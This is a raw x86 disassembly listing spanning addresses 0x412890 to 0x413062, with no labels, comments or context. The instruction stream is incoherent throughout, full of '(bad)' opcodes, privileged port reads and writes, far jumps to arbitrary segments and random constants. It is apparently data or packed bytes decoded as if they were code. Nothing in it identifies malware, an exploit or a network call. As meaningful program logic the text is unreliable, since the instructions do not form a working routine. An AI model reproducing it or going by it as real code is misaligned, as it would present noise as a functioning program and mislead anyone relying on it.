  412890:	dec    esi
  412891:	retf   0xf615
  412894:	xor    eax,0xf3f580a1
  412899:	inc    ebp
  41289a:	mov    ecx,0x5e2c9b85
  41289f:	cwde   
  4128a0:	push   ds
  4128a1:	mov    al,ds:0x9ee24259
  4128a6:	(bad)  
  4128a7:	mov    dh,0x54
  4128a9:	(bad)  
  4128aa:	mov    DWORD PTR [eax+edi*4+0x176969b9],eax
  4128b1:	call   0xff2a5624
  4128b6:	cmp    ebp,ebx
  4128b8:	popf   
  4128b9:	push   eax
  4128ba:	dec    ebx
  4128bb:	jbe    0x41290d
  4128bd:	jmp    0x1f:0x6bbc00e0
  4128c4:	lods   eax,DWORD PTR ds:[esi]
  4128c5:	dec    esi
  4128c6:	jbe    0x41289b
  4128c8:	jae    0x412853
  4128ca:	push   ecx
  4128cb:	jmp    DWORD PTR [eax-0x21]
  4128ce:	ja     0x41286b
  4128d0:	inc    edi
  4128d1:	pop    esi
  4128d2:	jb     0x4128f3
  4128d4:	in     eax,0xd3
  4128d6:	mov    ebx,0xf5ba476f
  4128db:	lea    ecx,[ebx]
  4128dd:	addr16 mov bl,0xe3
  4128e0:	push   edx
  4128e1:	dec    esi
  4128e2:	into   
  4128e3:	das    
  4128e4:	add    bl,ah
  4128e6:	clc    
  4128e7:	inc    ecx
  4128e8:	ins    DWORD PTR es:[edi],dx
  4128e9:	jp     0x412909
  4128eb:	or     eax,0xe560b2b7
  4128f0:	mov    ebp,0x53a9566a
  4128f5:	dec    eax
  4128f6:	enter  0xae47,0x19
  4128fa:	(bad)  
  4128fb:	mov    ds:0x171f2a5,al
  412900:	daa    
  412901:	or     al,0x62
  412904:	stc    
  412905:	mov    bl,0xf
  412907:	jo     0x412940
  412909:	out    dx,al
  41290a:	je     0x41296a
  41290c:	sbb    eax,0x4c1d4247
  412911:	mov    esp,0xe67c6bdf
  412916:	outs   dx,BYTE PTR ds:[esi]
  412917:	call   0x2e6d:0x6f026023
  41291e:	test   al,0x85
  412920:	push   edi
  412921:	sbb    eax,0xdb2bef58
  412926:	ror    bl,0x3c
  412929:	pop    edi
  41292a:	inc    eax
  41292b:	or     cl,BYTE PTR [edi]
  41292d:	adc    BYTE PTR [edi],ah
  41292f:	fdiv   QWORD PTR [ebx+esi*1+0x48]
  412933:	pop    ebp
  412934:	dec    esi
  412935:	or     al,0x27
  412937:	add    DWORD PTR [eax],eax
  412939:	add    al,dl
  41293b:	cmp    cl,al
  41293d:	imul   edi,DWORD PTR [edi+0x3f],0xf25dcb37
  412944:	inc    ebp
  412945:	repz pushf 
  412947:	jne    0x412909
  412949:	in     eax,dx
  41294a:	fiadd  WORD PTR [ecx+0x20]
  41294d:	test   al,0x3a
  41294f:	xchg   esi,eax
  412950:	sbb    DWORD PTR [ebp+0x34],esp
  412953:	sbb    al,0x96
  412955:	outs   dx,BYTE PTR ds:[esi]
  412956:	add    eax,0x502add42
  41295b:	inc    edi
  41295c:	test   BYTE PTR [ebx],ch
  41295e:	sbb    al,0x22
  412960:	mov    bx,0xc2b4
  412964:	in     eax,0xbe
  412966:	mov    WORD PTR [ebx+0x44],ss
  412969:	and    al,0xfd
  41296b:	add    BYTE PTR [edi-0x39a3221d],0x13
  412972:	or     esi,DWORD PTR [edx+0x77]
  412975:	fmul   DWORD PTR [ebx+0x708398b2]
  41297b:	xor    al,0xbb
  41297d:	mov    dh,0xf
  41297f:	sub    BYTE PTR [ecx-0x5d],al
  412982:	sub    ebp,DWORD PTR [ebx+ebx*8]
  412985:	mov    bl,0xa1
  412987:	cmp    eax,0xa6bb10be
  41298c:	in     al,0xe0
  41298e:	sar    DWORD PTR [edi+ebp*2],0x5e
  412992:	in     eax,0x95
  412994:	xor    eax,0x3815be05
  412999:	sahf   
  41299a:	mov    bh,0xc2
  41299c:	xor    DWORD PTR [edx-0x79c9f7a4],0x47
  4129a3:	pop    edi
  4129a4:	das    
  4129a5:	pusha  
  4129a6:	mov    esp,0x2e0a0406
  4129ab:	inc    eax
  4129ac:	and    ch,BYTE PTR [edx]
  4129ae:	pop    ebx
  4129af:	mov    DWORD PTR [edi-0x32aaf0b5],edi
  4129b5:	pop    edx
  4129b6:	inc    edx
  4129b7:	jecxz  0x41295f
  4129b9:	cli    
  4129ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129bb:	aam    0xb4
  4129bd:	shl    DWORD PTR [ebx+0x38],cl
  4129c0:	aaa    
  4129c1:	lods   eax,DWORD PTR ds:[esi]
  4129c2:	and    eax,0x27cf3b5a
  4129c7:	test   BYTE PTR [ecx+ebp*4],bl
  4129ca:	fst    DWORD PTR [edi]
  4129cc:	sub    BYTE PTR [edi],ah
  4129ce:	scas   eax,DWORD PTR es:[edi]
  4129cf:	inc    ecx
  4129d0:	rol    dl,cl
  4129d2:	test   eax,0x668960df
  4129d7:	lods   al,BYTE PTR ds:[esi]
  4129d8:	pop    ds
  4129d9:	or     eax,0x3a2da14e
  4129de:	and    al,0x71
  4129e0:	shrd   DWORD PTR [esi+0x4a1a7e36],eax,cl
  4129e7:	outs   dx,BYTE PTR ds:[esi]
  4129e8:	ret    0x1d4
  4129eb:	cmp    DWORD PTR [ecx],esp
  4129ed:	repnz inc eax
  4129ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129f0:	cli    
  4129f1:	faddp  st(4),st
  4129f3:	xor    eax,0x783cfc69
  4129f8:	mov    edx,0x7c898e7d
  4129fd:	stos   BYTE PTR es:[edi],al
  4129fe:	jmp    0x412a41
  412a00:	fwait
  412a01:	xor    BYTE PTR [edi-0x17],ch
  412a04:	pusha  
  412a05:	cmp    BYTE PTR [edi],bh
  412a07:	xor    eax,0xb265fff9
  412a0c:	adc    al,0x7e
  412a0e:	sub    al,0x9a
  412a10:	lds    ebp,FWORD PTR [ebx]
  412a12:	fldcw  WORD PTR [ebp+esi*4+0x54]
  412a16:	aad    0x29
  412a18:	mov    edx,0x88b19b61
  412a1d:	cmp    eax,0xdeafd11b
  412a22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a23:	daa    
  412a24:	into   
  412a25:	loop   0x4129ef
  412a27:	aad    0xd1
  412a29:	retf   
  412a2a:	ror    DWORD PTR [ecx],1
  412a2c:	mov    ah,0xeb
  412a2e:	popf   
  412a2f:	fs (bad) 
  412a31:	sub    DWORD PTR [ebp-0x38],esp
  412a34:	shl    DWORD PTR [ebx+0x3121790],0x3a
  412a3b:	xchg   edx,eax
  412a3c:	xor    ecx,DWORD PTR [esi-0x33]
  412a3f:	push   ebp
  412a40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a41:	adc    edx,DWORD PTR [eax+0x1f]
  412a44:	(bad)  
  412a45:	idiv   BYTE PTR [bp+0x3113]
  412a4a:	ins    DWORD PTR es:[edi],dx
  412a4b:	dec    ebx
  412a4c:	repnz std 
  412a4e:	mov    DWORD PTR ds:0x5c476fc,ebp
  412a54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a55:	cmp    eax,0x13a25060
  412a5a:	shl    BYTE PTR [eax+0xc],cl
  412a5d:	addr16 cli 
  412a5f:	hlt    
  412a60:	mov    BYTE PTR [edi],dl
  412a62:	sub    BYTE PTR [edi],ah
  412a64:	cld    
  412a65:	dec    al
  412a67:	ins    BYTE PTR es:[edi],dx
  412a68:	ret    0x2ff2
  412a6b:	pushf  
  412a6c:	call   0xb8c4:0xde11b181
  412a73:	or     al,0x70
  412a75:	sbb    DWORD PTR [edi-0x5b9450dc],ebx
  412a7b:	ja     0x412add
  412a7d:	cld    
  412a7e:	jmp    0xec0fa01d
  412a83:	add    ch,BYTE PTR [edx-0x71]
  412a86:	movq   mm1,mm7
  412a89:	shl    BYTE PTR [edx-0xaea6aee],cl
  412a8f:	ror    DWORD PTR [ebx+0x21],1
  412a92:	hlt    
  412a93:	std    
  412a94:	dec    esi
  412a95:	jecxz  0x412a2f
  412a97:	adc    edi,ebx
  412a99:	xchg   esi,eax
  412a9a:	and    al,0x81
  412a9c:	dec    esp
  412a9d:	das    
  412a9e:	sar    BYTE PTR [ebx+ebp*1-0x56],1
  412aa2:	mov    esp,0x13db0f7d
  412aa7:	mov    cl,0x33
  412aa9:	mov    eax,ds:0x8ed0050a
  412aae:	adc    eax,0x3a7f1db
  412ab3:	stos   DWORD PTR es:[edi],eax
  412ab4:	or     al,0x73
  412ab6:	dec    DWORD PTR [ebp+0x60]
  412ab9:	jb     0x412a62
  412abb:	mul    BYTE PTR [eax]
  412abd:	sbb    al,0x39
  412abf:	mov    dh,0x1e
  412ac1:	mov    eax,0x42173258
  412ac6:	rcr    DWORD PTR [esi],0x7
  412ac9:	std    
  412aca:	lods   al,BYTE PTR ds:[esi]
  412acb:	inc    ecx
  412acc:	mov    WORD PTR [esi-0x4e43aaa1],es
  412ad2:	inc    edx
  412ad3:	dec    esi
  412ad4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ad5:	out    dx,al
  412ad6:	sti    
  412ad7:	retf   0x173e
  412ada:	mov    edi,0xa5ad3c4f
  412adf:	jne    0x412b0e
  412ae1:	dec    esi
  412ae2:	popa   
  412ae3:	ret    
  412ae4:	stc    
  412ae5:	ins    BYTE PTR es:[edi],dx
  412ae6:	sub    DWORD PTR [esi-0x76],eax
  412ae9:	xor    ch,BYTE PTR [edi+0x73]
  412aec:	mov    al,ds:0xfc631a62
  412af1:	mov    es,WORD PTR [ebp+0x5b]
  412af4:	push   esp
  412af5:	test   al,0x82
  412af7:	lea    eax,[ebx+0x2e]
  412afa:	popa   
  412afb:	mov    sp,si
  412afe:	mov    esi,0x832c3463
  412b03:	hlt    
  412b04:	rcl    BYTE PTR [edi-0x12],cl
  412b07:	jb     0x412b4c
  412b09:	cmp    al,0x4c
  412b0b:	mov    edx,0x336aef63
  412b10:	fiadd  WORD PTR [esp+edi*8]
  412b13:	sar    DWORD PTR [ebp+ebx*4-0x4505a2b6],cl
  412b1a:	inc    ebp
  412b1b:	push   edi
  412b1c:	cmp    DWORD PTR [ebx-0x4081d4a9],ecx
  412b22:	mov    BYTE PTR [edi+0x30],dh
  412b25:	inc    ecx
  412b26:	scas   eax,DWORD PTR es:[edi]
  412b27:	xchg   esp,eax
  412b28:	arpl   di,dx
  412b2a:	mov    esi,0x73c8c93a
  412b2f:	jmp    0x2f50:0x69b93f4a
  412b36:	pop    edi
  412b37:	push   ecx
  412b38:	jb     0x412b27
  412b3a:	dec    dx
  412b3c:	pop    edi
  412b3d:	test   DWORD PTR [esi],eax
  412b3f:	xchg   ebp,eax
  412b40:	dec    edi
  412b41:	ror    DWORD PTR [esi+0x30],0x42
  412b45:	sub    BYTE PTR [ecx-0x5b],dl
  412b48:	pop    ebp
  412b49:	adc    bh,BYTE PTR [edi+eax*1+0x216ca8bc]
  412b50:	xor    BYTE PTR [ecx+0x0],cl
  412b53:	aam    0xac
  412b55:	into   
  412b56:	sbb    BYTE PTR [ebx-0x33],dh
  412b59:	scas   eax,DWORD PTR es:[edi]
  412b5a:	and    BYTE PTR [ecx-0x1a8a34e3],cl
  412b60:	xor    al,BYTE PTR [eax+0x4bbb07b4]
  412b66:	cmp    DWORD PTR [eax+ecx*4],ebp
  412b69:	pop    ebx
  412b6a:	pop    ebx
  412b6b:	and    eax,0x528ef2d2
  412b70:	push   eax
  412b71:	and    cl,0xc9
  412b74:	daa    
  412b75:	mov    eax,ds:0x6615f60d
  412b7a:	mov    eax,ds:0x548d6357
  412b7f:	mov    esp,DWORD PTR [ebp+0x29]
  412b82:	test   DWORD PTR [esp+esi*4],edx
  412b85:	shl    BYTE PTR [ebp-0x7345eca],0x8b
  412b8c:	pop    ss
  412b8d:	or     DWORD PTR [esi-0x18],esi
  412b90:	xor    dh,ah
  412b92:	shl    DWORD PTR [ecx+ecx*2-0x36980c28],1
  412b99:	fs mov ch,0x9c
  412b9c:	add    al,0x9a
  412b9e:	dec    edi
  412b9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ba0:	inc    edi
  412ba1:	(bad)  
  412ba2:	in     eax,0x37
  412ba4:	jecxz  0x412bf4
  412ba6:	(bad)  
  412ba7:	xor    al,BYTE PTR [ebp-0x1a8a96da]
  412bad:	sbb    ah,ch
  412baf:	mov    al,ds:0x44073f16
  412bb4:	jl     0x412b8a
  412bb6:	cmc    
  412bb7:	push   0xb
  412bb9:	cdq    
  412bba:	push   ecx
  412bbb:	cld    
  412bbc:	cli    
  412bbd:	jle    0x412bae
  412bbf:	call   0x932d00a1
  412bc4:	ins    DWORD PTR es:[edi],dx
  412bc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bc6:	fsubr  QWORD PTR [eax+0x40d740c2]
  412bcc:	cli    
  412bcd:	(bad)  [ebx-0x61]
  412bd0:	jno    0x412c16
  412bd2:	lahf   
  412bd3:	sbb    eax,0x4ccd7008
  412bd8:	jge    0x412bc0
  412bda:	jg     0x412be7
  412bdc:	and    ch,BYTE PTR [eax+0x50]
  412bdf:	sub    eax,0x167e59b3
  412be4:	shl    ecx,cl
  412be6:	jp     0x412beb
  412be8:	jno    0x412bd3
  412bea:	cld    
  412beb:	or     al,0x8
  412bed:	jge    0x412bc1
  412bef:	test   DWORD PTR [eax-0x130e49f5],esp
  412bf5:	fsubr  DWORD PTR [ebp-0x7b]
  412bf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bf9:	inc    ebx
  412bfa:	js     0x412b93
  412bfc:	mov    ebx,0x832b73f3
  412c01:	mov    dh,0x5f
  412c03:	cmc    
  412c04:	xchg   ebp,eax
  412c05:	xchg   esi,eax
  412c06:	dec    esp
  412c07:	add    ecx,DWORD PTR [ecx+0xddea260]
  412c0d:	push   0x972f554b
  412c12:	rcr    ebx,1
  412c14:	fwait
  412c15:	jo     0x412c6d
  412c17:	and    al,0x6c
  412c19:	loop   0x412c22
  412c1b:	sub    BYTE PTR [edi],bh
  412c1d:	pop    ds
  412c1e:	dec    ebp
  412c1f:	lds    esi,FWORD PTR [eax+0x2f812a90]
  412c25:	mov    WORD PTR [ebx-0x3ec68127],cs
  412c2b:	sbb    BYTE PTR [edi-0x1dab2f57],ah
  412c31:	into   
  412c32:	out    0xf4,eax
  412c34:	adc    al,0x89
  412c36:	push   ds
  412c37:	mov    ds:0x7ecf2300,eax
  412c3c:	sub    DWORD PTR [eax],ebp
  412c3e:	pop    ecx
  412c3f:	sbb    eax,0x9043f82
  412c44:	adc    esp,edi
  412c46:	iret   
  412c47:	add    cl,dl
  412c49:	fcom   QWORD PTR [ebp+eax*8-0x12]
  412c4d:	inc    ebx
  412c4e:	push   ecx
  412c4f:	stos   BYTE PTR es:[edi],al
  412c50:	lahf   
  412c51:	fisubr WORD PTR [edx+0xb24ce5c]
  412c57:	jnp    0x412c08
  412c59:	mov    bl,0x5f
  412c5b:	leave  
  412c5c:	jns    0x412c4b
  412c5e:	xchg   esi,eax
  412c5f:	fs fs sub eax,0xfc1f165a
  412c66:	sbb    DWORD PTR [edx],ecx
  412c68:	cmp    bl,BYTE PTR [ebx-0x75d1dec7]
  412c6e:	dec    ebx
  412c6f:	xchg   BYTE PTR [ebx+0x43fb8fd6],ah
  412c75:	xchg   ecx,eax
  412c76:	mov    dl,BYTE PTR [edi+0x2a]
  412c79:	(bad)  
  412c7a:	outs   dx,DWORD PTR ds:[esi]
  412c7b:	mov    al,ds:0x5a3043db
  412c80:	push   edi
  412c81:	aaa    
  412c82:	jne    0x412c0d
  412c84:	xor    eax,0x48319aa8
  412c89:	mov    BYTE PTR [ebx-0x1f],ch
  412c8c:	push   0xffffffd6
  412c8e:	and    eax,0x2613fb1b
  412c93:	add    eax,0x8678299b
  412c98:	inc    edi
  412c99:	loope  0x412d17
  412c9b:	jbe    0x412c75
  412c9d:	mov    DWORD PTR [eax+0x7d],esi
  412ca0:	(bad)  
  412ca2:	jge    0x412c37
  412ca4:	jle    0x412c67
  412ca6:	clc    
  412ca7:	xchg   esp,eax
  412ca8:	push   ebp
  412ca9:	shl    BYTE PTR [edi],cl
  412cab:	cmc    
  412cac:	test   BYTE PTR [edi],bh
  412cae:	or     DWORD PTR [ecx+0x2c],ebp
  412cb1:	mov    cl,0xf8
  412cb3:	dec    ecx
  412cb4:	pop    edi
  412cb5:	std    
  412cb6:	adc    bh,BYTE PTR [edx+ecx*1+0x28]
  412cba:	lods   al,BYTE PTR ds:[esi]
  412cbb:	sub    eax,0x4c03d152
  412cc0:	jecxz  0x412c6b
  412cc2:	ds test al,0xfa
  412cc5:	dec    edx
  412cc6:	xchg   edx,eax
  412cc7:	sub    DWORD PTR [ebx],eax
  412cc9:	add    eax,0xe2667ad6
  412cce:	(bad)  
  412ccf:	cmp    DWORD PTR ds:0x279e353f,edi
  412cd5:	jno    0x412c74
  412cd7:	inc    edi
  412cd8:	add    ebp,ebx
  412cda:	js     0x412ca3
  412cdc:	test   DWORD PTR [edx-0x78814eaa],edi
  412ce2:	in     al,0xb8
  412ce4:	clc    
  412ce5:	cli    
  412ce6:	loop   0x412c71
  412ce8:	jns    0x412c96
  412cea:	popa   
  412ceb:	mov    BYTE PTR [ecx],ah
  412ced:	or     eax,0xe0ecef4f
  412cf2:	daa    
  412cf3:	cmp    eax,0x770a77dc
  412cf8:	mov    al,0x9c
  412cfa:	sub    al,0x19
  412cfc:	scas   al,BYTE PTR es:[edi]
  412cfd:	mov    BYTE PTR [eax-0x10972564],dl
  412d03:	and    DWORD PTR [edi+0x6c6add11],0x11
  412d0a:	add    al,0x7e
  412d0c:	inc    ecx
  412d0d:	mov    fs,WORD PTR [eax+0x25918654]
  412d13:	or     eax,0x1567c94a
  412d18:	jno    0x412d01
  412d1a:	pop    es
  412d1b:	cmp    dh,ch
  412d1d:	les    edx,FWORD PTR ds:0x8ffaa790
  412d23:	push   esi
  412d24:	sbb    BYTE PTR ds:0xf3c0fe00,bl
  412d2a:	dec    edx
  412d2b:	cmp    eax,0xbb9d33d6
  412d30:	jg     0x412cfb
  412d32:	sbb    dh,BYTE PTR [ebx-0x3e363e2]
  412d38:	ins    DWORD PTR es:[edi],dx
  412d39:	xor    edx,esi
  412d3b:	in     eax,0x1b
  412d3d:	xchg   esi,eax
  412d3e:	ds inc ebx
  412d40:	sti    
  412d41:	inc    ebp
  412d42:	icebp  
  412d43:	(bad)  
  412d44:	dec    eax
  412d45:	into   
  412d46:	nop
  412d47:	stc    
  412d48:	jne    0x412d2a
  412d4a:	jbe    0x412d89
  412d4c:	pop    es
  412d4d:	mov    edx,DWORD PTR [ebx]
  412d4f:	loope  0x412d48
  412d51:	xchg   edx,eax
  412d52:	push   0x152fa3f0
  412d57:	jl     0x412d17
  412d59:	cmp    ch,dh
  412d5b:	mov    ah,0xd5
  412d5d:	mov    edx,DWORD PTR [eax-0x77]
  412d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d61:	jbe    0x412dbd
  412d63:	ret    
  412d64:	mov    bl,0xfe
  412d66:	xchg   DWORD PTR [eax+ebx*8+0x72f81ee6],esi
  412d6d:	leave  
  412d6e:	sub    BYTE PTR ds:0x7845922b,bh
  412d74:	hlt    
  412d75:	inc    eax
  412d76:	sbb    eax,0x5a801d1d
  412d7b:	mov    ds:0x8b7049be,al
  412d80:	add    ch,bl
  412d82:	cli    
  412d83:	js     0x412d9a
  412d85:	icebp  
  412d86:	fs (bad) 
  412d88:	je     0x412dc5
  412d8a:	in     eax,dx
  412d8b:	cmp    BYTE PTR [eax-0x4b],dl
  412d8e:	aad    0x35
  412d90:	sbb    eax,ebp
  412d92:	add    eax,ebp
  412d94:	stos   DWORD PTR es:[edi],eax
  412d95:	or     al,0x39
  412d97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d98:	test   BYTE PTR [ebp+0x6c],dh
  412d9b:	add    ebp,0xc2deef54
  412da1:	mov    dl,0x90
  412da3:	addr16 int 0x66
  412da6:	test   eax,0x4aa92599
  412dab:	adc    DWORD PTR [ebx+0x6a09ea88],ecx
  412db1:	jb     0x412d98
  412db3:	std    
  412db4:	enter  0x62b9,0x12
  412db8:	aam    0x98
  412dba:	jle    0x412e28
  412dbc:	sbb    BYTE PTR [edi],0x8
  412dbf:	push   edx
  412dc0:	or     eax,0xd9add864
  412dc5:	inc    edi
  412dc6:	mov    dh,0x2
  412dc8:	or     BYTE PTR [ebp+0x6f],cl
  412dcb:	imul   edi,edx,0x68
  412dce:	stos   BYTE PTR es:[edi],al
  412dcf:	cmp    eax,0x305f422d
  412dd4:	(bad)  
  412dd5:	xor    DWORD PTR [edx],esp
  412dd7:	lds    ecx,FWORD PTR [ebx-0x4f]
  412dda:	out    0x99,al
  412ddc:	test   cl,cl
  412dde:	ins    BYTE PTR es:[edi],dx
  412ddf:	add    esp,0xe25b2c26
  412de5:	mov    eax,ds:0x310077cf
  412dea:	mov    eax,0xe663468c
  412def:	jnp    0x412d91
  412df1:	popa   
  412df2:	and    ebp,0x7b3172a1
  412df8:	and    DWORD PTR [esp+eax*8-0x5472c7f2],0xffffffb6
  412e00:	dec    esp
  412e01:	neg    DWORD PTR [edx+0x70]
  412e04:	jns    0x412e52
  412e06:	jl     0x412dd3
  412e08:	pop    edx
  412e09:	ja     0x412da0
  412e0b:	sti    
  412e0c:	or     bh,BYTE PTR [edx+edx*2]
  412e0f:	pushf  
  412e10:	rcr    BYTE PTR [ebp-0x195a44cb],1
  412e16:	mov    cl,0xf4
  412e18:	es out 0xf2,eax
  412e1b:	rol    esp,1
  412e1d:	test   eax,0xcfa882ff
  412e22:	into   
  412e23:	dec    esi
  412e25:	or     eax,0x3f395773
  412e2a:	ins    BYTE PTR es:[edi],dx
  412e2b:	cld    
  412e2c:	sti    
  412e2d:	cmp    eax,0xc229b0c9
  412e32:	fisttp QWORD PTR [ebx-0x64142aaf]
  412e38:	mov    al,ds:0xca732811
  412e3d:	gs add al,0x3f
  412e40:	js     0x412e23
  412e42:	leave  
  412e43:	call   0xf2ee:0xc252bf8
  412e4a:	imul   edx,DWORD PTR [ebx+0x2],0x3faeed4d
  412e51:	ds ins DWORD PTR es:[edi],dx
  412e53:	inc    edi
  412e54:	ja     0x412e06
  412e56:	mov    eax,0xc3aeee61
  412e5b:	lods   al,BYTE PTR ds:[esi]
  412e5c:	js     0x412e0a
  412e5e:	ins    DWORD PTR es:[edi],dx
  412e5f:	xchg   esp,eax
  412e60:	(bad)  
  412e61:	sub    edx,edx
  412e63:	xchg   edx,eax
  412e64:	fisub  WORD PTR [ebp+0x30eccac6]
  412e6a:	icebp  
  412e6b:	fs jmp 0x412ead
  412e6e:	sbb    esp,DWORD PTR [ebp-0x6b]
  412e71:	in     al,dx
  412e72:	cmp    eax,0xa22f1e7f
  412e77:	mov    dl,0xb5
  412e79:	lahf   
  412e7a:	inc    ebp
  412e7b:	adc    al,0xf6
  412e7d:	add    DWORD PTR [edx+0x2c0f9e13],edx
  412e83:	cmp    DWORD PTR [ebp+0x37],eax
  412e86:	inc    edx
  412e87:	push   ss
  412e88:	and    DWORD PTR [ebp+0x356d07dc],0x4f
  412e8f:	out    0x8,al
  412e91:	rcl    BYTE PTR [ecx],1
  412e93:	fwait
  412e94:	aas    
  412e95:	jmp    0xfd29a6da
  412e9a:	sahf   
  412e9b:	mov    ds:0xf1b911b3,eax
  412ea0:	ins    BYTE PTR es:[edi],dx
  412ea1:	ss inc esp
  412ea3:	add    BYTE PTR [eax-0x3e5884fd],cl
  412ea9:	shr    bl,1
  412eab:	dec    esp
  412eac:	mov    gs,WORD PTR [esi-0xb]
  412eaf:	fwait
  412eb0:	cld    
  412eb1:	out    0x19,al
  412eb3:	adc    BYTE PTR [ebx],cl
  412eb5:	arpl   WORD PTR [eax],bp
  412eb7:	push   ds
  412eb8:	mov    dl,BYTE PTR [esi-0x4878193a]
  412ebe:	mov    ebx,0x99cbcd56
  412ec3:	fistp  QWORD PTR [edx-0x106d5a12]
  412ec9:	es xchg ebp,eax
  412ecb:	leave  
  412ecc:	xor    DWORD PTR [ecx+edx*2],esi
  412ecf:	rol    DWORD PTR [edi+0x30],cl
  412ed2:	dec    ecx
  412ed3:	sub    eax,0x99c75af5
  412ed8:	inc    BYTE PTR [esi-0x175dcb21]
  412ede:	sbb    cl,BYTE PTR [edi+ebp*1+0x13536448]
  412ee5:	stos   BYTE PTR es:[edi],al
  412ee6:	mov    ebx,0x46bed3aa
  412eeb:	mov    DWORD PTR [ebp+0x11eab79e],edx
  412ef1:	(bad)  
  412ef2:	cwde   
  412ef3:	ins    DWORD PTR es:[edi],dx
  412ef4:	add    BYTE PTR [ecx+0x41cdd63c],bh
  412efa:	cdq    
  412efb:	sbb    bh,BYTE PTR [ebp+0x4e]
  412efe:	test   eax,0x2965492a
  412f03:	leave  
  412f04:	lds    sp,DWORD PTR [edx+0x78]
  412f08:	push   ds
  412f09:	or     cl,BYTE PTR [eax-0x3a11acdd]
  412f0f:	jnp    0x412f38
  412f11:	in     eax,0x75
  412f13:	adc    eax,0xaaaf21b7
  412f18:	push   eax
  412f19:	pop    esp
  412f1a:	ret    
  412f1b:	push   edi
  412f1c:	aam    0x80
  412f1e:	loopne 0x412ebd
  412f20:	pusha  
  412f21:	push   es
  412f22:	loope  0x412f58
  412f24:	test   al,0xcf
  412f26:	push   edx
  412f27:	add    al,0x74
  412f29:	pop    es
  412f2a:	das    
  412f2b:	adc    esp,ecx
  412f2d:	aam    0x98
  412f2f:	sub    al,0x67
  412f31:	sbb    al,0x3a
  412f33:	xor    al,0xb0
  412f35:	aas    
  412f36:	add    eax,0x9d8b368d
  412f3b:	mov    esp,0x44547947
  412f40:	xchg   DWORD PTR [eax+0x73dec94f],esp
  412f46:	sub    ecx,DWORD PTR ds:0x10d4ec7
  412f4c:	add    al,0x63
  412f4e:	lea    ebx,[edx]
  412f50:	adc    BYTE PTR [edx+0x5547c474],bl
  412f56:	rcr    ah,cl
  412f58:	push   ecx
  412f59:	int    0x26
  412f5b:	or     eax,0xda05fa75
  412f60:	push   0xfe1b677d
  412f65:	mov    ds:0x570270e2,al
  412f6a:	pop    ebx
  412f6b:	mov    WORD PTR [esi-0x438af4cd],fs
  412f71:	idiv   DWORD PTR [ebp*8-0x7839d861]
  412f78:	rol    BYTE PTR [ebx+0x2d8f1cda],1
  412f7e:	pop    ebx
  412f7f:	xchg   esp,eax
  412f80:	(bad)  
  412f81:	mov    bh,0x34
  412f83:	adc    edi,esi
  412f85:	int3   
  412f86:	ss jp  0x412fdb
  412f89:	sub    al,0xb7
  412f8b:	into   
  412f8c:	test   al,0xfe
  412f8e:	rol    DWORD PTR [edi+esi*1],cl
  412f91:	je     0x412f7d
  412f93:	jmp    0x4e85e828
  412f98:	push   esi
  412f99:	cmc    
  412f9a:	pop    ebx
  412f9b:	test   eax,0x190d3cfc
  412fa0:	imul   edx,esi,0xdcfc6c49
  412fa6:	jns    0x41301f
  412fa8:	call   0xc89:0xe264a610
  412faf:	std    
  412fb0:	adc    BYTE PTR [esi],cl
  412fb2:	lods   al,BYTE PTR ds:[esi]
  412fb3:	sbb    ebp,DWORD PTR [eax+0x12c52f25]
  412fb9:	push   esp
  412fba:	out    0x92,eax
  412fbc:	or     cl,BYTE PTR [ebx+0x0]
  412fbf:	jg     0x413011
  412fc1:	outs   dx,BYTE PTR ds:[esi]
  412fc2:	in     al,0x2a
  412fc4:	add    ecx,DWORD PTR [edi]
  412fc6:	mov    bl,0xe3
  412fc8:	fist   DWORD PTR [ebp-0x70df9277]
  412fce:	add    bh,BYTE PTR [esp+eiz*4+0x2c]
  412fd2:	(bad)  
  412fd3:	push   0xa39c5069
  412fd8:	xlat   BYTE PTR ds:[ebx]
  412fd9:	cmp    al,0xd0
  412fdb:	inc    ebp
  412fdc:	add    BYTE PTR ds:0x64e13719,cl
  412fe2:	outs   dx,DWORD PTR ds:[esi]
  412fe3:	pop    ds
  412fe4:	in     al,dx
  412fe5:	inc    eax
  412fe6:	jns    0x412f7b
  412fe8:	or     ch,dh
  412fea:	sahf   
  412feb:	call   0x3f4da3b2
  412ff0:	and    ah,dl
  412ff2:	sar    BYTE PTR [ecx+0x68],cl
  412ff5:	push   ebp
  412ff6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ff7:	repnz cmp eax,0x9f7817e2
  412ffd:	test   al,0xa5
  412fff:	or     DWORD PTR [ebx],esi
  413001:	cmp    ecx,DWORD PTR ds:0xb24420fb
  413007:	aam    0x7b
  413009:	jbe    0x412faf
  41300b:	ret    0xb7ae
  41300e:	push   0x30
  413010:	sar    BYTE PTR [ebx-0x54],0xd9
  413014:	xor    BYTE PTR [ebp-0x40],ch
  413017:	out    0xf1,al
  413019:	pop    edi
  41301a:	xchg   ebx,eax
  41301b:	addr16 jge 0x412fc5
  41301e:	xchg   edx,eax
  41301f:	mov    dh,0x4
  413021:	jl     0x413036
  413023:	adc    eax,0xb4848114
  413028:	(bad)  
  413029:	jmp    0xfaf982a6
  41302e:	jp     0x41301e
  413030:	fdivp  st(6),st
  413032:	js     0x412fef
  413034:	cmp    DWORD PTR [ebp+0x23],ecx
  413037:	or     BYTE PTR [ebp-0xc],bl
  41303a:	pop    ebp
  41303b:	call   0x52d7:0x658e06d1
  413042:	or     ecx,edx
  413044:	retf   0x316a
  413047:	(bad)  
  413048:	into   
  413049:	or     ch,ah
  41304b:	lods   eax,DWORD PTR ds:[esi]
  41304c:	push   0xffffff84
  41304e:	or     eax,0x90916e28
  413053:	sbb    ebx,esp
  413055:	inc    eax
  413056:	jg     0x412ffe
  413058:	rcr    DWORD PTR [ecx+0x3497415],cl
  41305e:	std    
  41305f:	mov    dh,0x56
  413061:	pop    ss
  413062:	clc    
